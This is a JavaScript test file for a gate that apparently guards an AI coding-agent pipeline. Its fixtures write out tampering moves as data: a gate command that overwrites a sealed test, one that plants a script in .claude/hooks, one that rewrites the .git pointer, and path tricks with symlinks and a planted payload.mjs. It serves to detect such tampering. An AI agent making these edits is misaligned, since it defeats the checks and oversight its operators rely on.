test("M1: the carried metrics record hides nothing behind its path: a directory, a linked parent, a sealed file", async () => {
  const RECORD = ".marvin/metrics/001-demo.md";
  const header = "# Metrics — demo\n\nAppend-only.\n\n";
  const metricsRecord = { path: RECORD, slug: "demo" };
  const outside = mkdtempSync(join(tmpdir(), "adv-metrics-"));

  // A directory standing where the record was, holding a file git now lists inside it.
  const dir = runWorktree({ [RECORD]: header });
  rmSync(join(dir.path, RECORD));
  dir.write(`${RECORD}/payload.mjs`, "export default 1;\n");
  assert.deepEqual(claims(await gateStage(dir, { metricsRecord })), [
    `uncommitted work: ${RECORD}`,
    `uncommitted work: ${RECORD}/payload.mjs`,
  ]);

  // The record's directory swapped for a link to one outside the worktree.
  const linked = runWorktree({ [RECORD]: header });
  rmSync(join(linked.path, ".marvin", "metrics"), { recursive: true });
  mkdirSync(join(outside, "metrics"));
  writeFileSync(join(outside, "metrics", "001-demo.md"), header);
  symlinkSync(join(outside, "metrics"), join(linked.path, ".marvin", "metrics"));
  assert.ok(
    claims(await gateStage(linked, { metricsRecord })).some((c) =>
      c.startsWith("uncommitted work"),
    ),
  );

  // A record path that is also sealed is judged as the sealed file it is, never carried, even
  // when what was added is an append the metrics tool would write.
  const event = {
    slug: "demo",
    source: "marvin-tm-executor",
    step: "§3",
    kind: "spec-gap",
    at: "2026-10-12T10:00:00.000Z",
    detail: "x",
  };
  const sealedRecord = runWorktree({ [RECORD]: header });
  writeFileSync(
    join(sealedRecord.path, RECORD),
    `${header}\`\`\`json metric-event\n${JSON.stringify(event)}\n\`\`\`\n\n`,
  );
  assert.deepEqual(claims(await gateStage(sealedRecord, { metricsRecord })), []);
  const report = await gateStage(sealedRecord, {
    metricsRecord,
    sealed: [{ path: RECORD, sha256: g.sha256Bytes(Buffer.from(header)), criteria: ["AC1"] }],
  });
  assert.ok(claims(report).includes(`uncommitted work: ${RECORD}`));
  assert.equal(report.passed, false);
});

test("a gate that rewrites a sealed test and leaves it fails twice over", async () => {
  const { w, sealed } = withSealedTest();
  const report = await gateStage(w, {
    sealed,
    gates: [{ name: "test", command: "echo 'it(1)' > src/a.test.mjs" }],
  });
  assert.equal(report.passed, false);
  assert.deepEqual(report.sealed, [{ path: "src/a.test.mjs", ok: false }]);
  assert.deepEqual(claims(report), [
    "gates modified tracked file src/a.test.mjs",
    "sealed file src/a.test.mjs changed during gates",
  ]);
});

test("a gate that creates a protected file, or rewrites the .git pointer, is flagged", async () => {
  const w = runWorktree();
  const report = await gateStage(w, {
    gates: [
      { name: "setup", command: "mkdir -p .claude/hooks && echo x > .claude/hooks/y.sh" },
      { name: "evil", command: "echo 'gitdir: /nonexistent' > .git" },
    ],
  });
  assert.equal(report.passed, false);
  assert.deepEqual(report.protected, [".claude/hooks/y.sh"]);
  assert.deepEqual(report.protectedSources[".claude/hooks/y.sh"], ["post-gate snapshot"]);
  assert.deepEqual(claims(report), ["worktree .git pointer was changed during gates"]);
});

// ── the snapshot itself ──────────────────────────────────────────────────────

test("a protected snapshot covers tracked, untracked and ignored files and fingerprints each", () => {
  const w = runWorktree({ ".husky/pre-commit": "x\n", "src/a.ts": "a\n" });
  w.write(".husky/_/.gitignore", "*\n");
  w.write(".husky/_/h", "shim\n");
  symlinkSync("../elsewhere", join(w.path, ".husky/link"));
  w.write(".claude/settings.json", "{}\n");
  const snap = w.snapshot();
  assert.deepEqual(Object.keys(snap), [
    ".claude/settings.json",
    ".husky/_/.gitignore",
    ".husky/_/h",
    ".husky/link",
    ".husky/pre-commit",
  ]);
  assert.equal(snap[".husky/pre-commit"], g.sha256File(join(w.path, ".husky/pre-commit")));
  assert.equal(snap[".husky/link"], "link:../elsewhere");
  rmSync(join(w.path, ".husky/pre-commit"));
  const after = w.snapshot();
  assert.equal(after[".husky/pre-commit"], "missing");
  assert.deepEqual(g.diffProtected(snap, after), [".husky/pre-commit"]);
});

test("a protected snapshot comparison lists changed, added and removed paths, sorted", () => {
  assert.deepEqual(g.diffProtected({ a: "1", b: "2", c: "3" }, { a: "1", b: "9", d: "4" }), [
    "b",
    "c",
    "d",
  ]);
  assert.deepEqual(g.diffProtected({}, {}), []);
  assert.throws(() => g.snapshotProtected("/", "/", []), /non-empty array/);
});

test("the shipped defaults reach every default protected location in a real worktree", async () => {
  const w = runWorktree();
  for (const rel of [
    ".marvin/config.json",
    ".marvin/pipeline/x.yaml",
    ".claude/settings.local.json",
    ".claude/hooks/a.sh",
    ".husky/pre-push",
    ".mcp.json",
  ]) {
    w.write(rel, "x\n");
  }
  w.commit();
  const report = await gateStage(w);
  assert.equal(report.protected.length, 6);
  assert.deepEqual(report.protected, [
    ".claude/hooks/a.sh",
    ".claude/settings.local.json",
    ".husky/pre-push",
    ".marvin/config.json",
    ".marvin/pipeline/x.yaml",
    ".mcp.json",
  ]);
  assert.equal(report.passed, false);
  assert.deepEqual(defaultChecks.length, 3);
  assert.ok(protectedDefaults.length >= 6);
});
